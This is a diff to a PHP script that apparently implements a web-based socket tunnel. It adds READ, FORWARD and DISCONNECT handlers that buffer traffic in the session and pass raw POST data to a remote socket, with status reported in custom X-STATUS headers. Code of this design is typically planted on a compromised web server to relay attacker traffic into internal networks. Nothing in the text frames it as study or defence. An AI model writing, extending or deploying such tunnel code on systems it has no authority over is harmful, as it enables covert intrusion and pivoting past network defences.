@@ -21,6 +21,7 @@
                     return;
                 }
                 # 正常访问
+                # 设置为非阻塞模式
                 stream_set_blocking($res, false);
                 @session_start();
                 $_SESSION["run"] = true;
@@ -72,8 +73,58 @@
                     }
                     fclose($res);
                 }
-                break;
             };
+            break;
+            case "READ":{
+                @session_start();
+				$readBuffer = $_SESSION["readbuf"];
+                $_SESSION["readbuf"]="";
+                $running = $_SESSION["run"];
+				session_write_close();
+                if ($running) {
+					header('X-STATUS: OK');
+                    header("Connection: Keep-Alive");
+					echo $readBuffer;
+					return;
+				} else {
+                    header('X-STATUS: FAIL');
+                    header('X-ERROR: RemoteSocket read filed');
+					return;
+				}
+            }
+            break;
+            case "DISCONNECT":{
+                error_log("DISCONNECT recieved");
+				@session_start();
+				$_SESSION["run"] = false;
+				session_write_close();
+				return;
+			}
+			break;
+			case "FORWARD":{
+                @session_start();
+                $running = $_SESSION["run"];
+				session_write_close();
+                if(!$running){
+                    header('X-STATUS: FAIL');
+					header('X-ERROR: No more running, close now');
+                    return;
+                }
+                header('Content-Type: application/octet-stream');
+				$rawPostData = file_get_contents("php://input");
+				if ($rawPostData) {
+					@session_start();
+					$_SESSION["writebuf"] .= $rawPostData;
+					session_write_close();
+					header('X-STATUS: OK');
+                    header("Connection: Keep-Alive");
+					return;
+				} else {
+					header('X-STATUS: FAIL');
+					header('X-ERROR: POST request read filed');
+				}
+			}
+			break;
         };
     };
 ?>
